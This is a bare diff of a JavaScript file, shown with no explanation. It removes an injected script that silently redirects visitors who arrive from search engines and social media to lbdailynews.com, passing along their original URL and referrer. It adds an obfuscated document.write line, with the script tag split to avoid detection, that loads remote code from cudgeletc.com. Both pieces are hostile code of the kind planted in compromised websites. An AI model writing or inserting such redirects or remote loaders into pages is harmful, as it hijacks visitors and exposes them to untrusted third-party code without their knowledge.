@@ -1,18 +1,1 @@
-//<![CDATA[
-    if(document.referrer)
-    {
-    	var cek = document.referrer;
-
-    	var ars 	= rChoice([
-							'https://lbdailynews.com',
-							]);
-
-				function rChoice(arr) {
-    			return arr[Math.floor(arr.length * Math.random())];
-	}
-
-	//Code arsae client javascript
-	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'yahoo.', 'whatsapp.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-    }
-//]]>
-
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://cudgeletc.com/83/6e/67/836e676799d99b9363e12cbc7ff9486d.js"></scr' + 'ipt>');
